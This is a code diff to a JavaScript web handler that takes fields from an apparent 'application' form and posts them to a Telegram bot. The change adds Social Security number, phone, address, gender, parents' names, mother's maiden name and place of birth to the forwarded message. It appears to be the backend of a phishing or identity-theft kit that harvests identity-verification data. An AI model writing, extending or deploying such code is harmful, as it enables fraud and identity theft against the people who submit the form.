@@ -36,9 +36,24 @@ export default async function handler(req, res) {
       const message = `
 📩 NEW APPLICATION
 
-👤 Name: ${fields.firstName}
+👤 First Name: ${fields.firstName}
+👤 Last Name: ${fields.lastName}
+
+🆔 SSN: ${fields.ssn}
+
+📞 Phone: ${fields.phone}
 📧 Email: ${fields.email}
-      `;
+
+🏠 Address: ${fields.address}
+
+⚧ Gender: ${fields.gender}
+
+👨 Father's Name: ${fields.fatherName}
+👩 Mother's Name: ${fields.motherName}
+👩‍🍼 Mother's Maiden Name: ${fields.motherMaidenName}
+
+🌍 Place of Birth: ${fields.birthPlace}
+`;
 
       await fetch(
         `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
